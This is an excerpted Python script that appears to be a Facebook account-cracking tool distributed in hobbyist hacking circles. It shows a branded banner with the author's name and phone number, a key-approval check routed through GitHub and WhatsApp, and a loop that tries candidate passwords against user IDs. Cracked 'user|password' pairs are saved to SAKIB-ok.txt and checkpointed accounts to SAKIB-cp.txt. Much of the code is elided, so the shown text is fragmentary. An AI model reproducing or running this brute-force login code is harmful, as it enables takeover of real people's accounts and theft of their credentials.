...
def logo():
	print("""%s
     .d8888.  .d8b.  db   dD d888888b d8888b. 
88'  YP d8' `8b 88 ,8P'   `88'   88  `8D 
`8bo.   88ooo88 88,8P      88    88oooY' 
  `Y8b. 88~~~88 88`8b      88    88~~~b. 
db   8D 88   88 88 `88.   .88.   88   8D 
`8888Y' YP   YP YP   YD Y888888P Y8888P'
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : MD NAJMUS SAKIB  \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : MD NAJMUS SAKIB    \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MD NAJMUS SAKIB    \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801952677267     \033[1;93m▇▇
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/Sakibbhai123/test.py/blob/main/Approval.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        os.system('clear')
        os.system('xdg-open https://facebook.com/groups/1181099812262006/' )
        logo()
        print('')
        ...
        os.system('am start https://wa.me/+8801952677267?text=' + tks)
        reg()
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20SAKIB-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+88013161655549?text=' + tks)
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY :MD NAJMUS SAKIB");time.sleep (0.03)
    print("             [*]. FACEBOOK   : MD NAJMUS SAKIB");time.sleep (0.03)
    print("             [*]. GITHUB     : MD NAJMUS SAKIB");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [SAKIB] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-SAKIB] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('SAKIB-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-SAKIB] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SAKIB-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
